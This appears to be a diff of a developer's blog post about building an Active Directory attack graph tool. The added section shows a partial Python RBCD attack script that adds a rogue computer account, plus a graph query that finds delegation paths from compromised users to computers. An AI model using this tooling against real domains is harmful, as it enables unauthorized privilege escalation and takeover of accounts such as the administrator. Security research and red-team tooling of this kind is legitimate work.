@@ -32,7 +32,74 @@ One big issue with building the collection script was supporting Kerberos and re
 https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/
 
 
-Writing the collection script is what took the longest time because I also had to reverse engineer how bloodhound worked a little and do a bunch of debugging to figure out what information and how to commit it to the graph as well as how to connect nodes.
+Writing the collection script is what took the longest time because I also had to do a little reverse engineering on how bloodhound python worked and do a bunch of debugging to figure out what information and how to commit it to the graph as well as how to connect nodes. After collecting nodes next was to graph and link them that's where I read and parsed SnTSecurityDescriptors. No python modules supported it, so I had to do it manually.
 
 
-Post will be updated soon.
+
+### Examples
+After getting the collection script working next was to write some examples for how to use the graph data and the other endpoints of the API.
+
+Some examples I built included a kerberoasting script and a RBCD (Resource Based Constrained Delegation) attack script. Some code snippets for the RBCD script:
+```python
+def run(user, password, hash_, aeskey, delegate_to):
+  comp_name = 'randomcomputer550'
+  comp_pass = 'Password123!'
+  j = {
+    "target": {
+      "domain": domain,
+      "dc": dc,
+      "kerberos": "False",
+      "ldap_ssl": "False",
+      "user_name": user,
+      "dc_ip": dc_ip
+    },
+    "kerb": {
+      "password": password,
+      "user_hash": hash_,
+      "aeskey": aeskey
+    },
+    "ops": {
+      "option": "add_computer",
+      "computer_name": comp_name,
+      "computer_pass": comp_pass,
+      "ou": "",
+      "contianer": ""
+    }
+  }
+
+  response = req.post('http://localhost:9000/ldap/objeditor', json=j).json()
+  print(response)
+
+  if "error" in response['response'] and "entryAlreadyExists" not in response['response']:
+      raise Custom_exception(message=response['response'])
+
+
+  j = {
+    "target": {
+      "domain": domain,
+      "dc": dc,
+      "kerberos": "False",
+      "ldap_ssl": "False",
+      "user_name": user,
+      "dc_ip": dc_ip
+    },
+    "kerb": {
+      "password": password,
+      "user_hash": hash_,
+      "aeskey": aeskey
+    }
+  }
+```
+The script would add a new computer to the domain and then modify its permissions to have control over an object it can delegate to like the administrator user. All of it is automated by the script running a query to get possible RBCD paths to users. The query:
+```sql
+MATCH path1=(n {t: "user"})-[ *ALLSHORTEST (r, n | 1)]->(m)
+WHERE m.disabled IS NULL AND m.t = "computer"
+  AND n.disabled IS NULL 
+  AND n.pwned = "True" 
+  AND m.pwned IS NULL 
+  AND m.added_comp IS NULL 
+  AND NOT m.name = 'randomcomputer550$'
+  AND ALL(rel IN relationships(path1) WHERE type(rel) IN ["memberOf", "GENERIC_ALL"])
+  AND size(relationships(path1)) > 0
+RETURN path1
+```
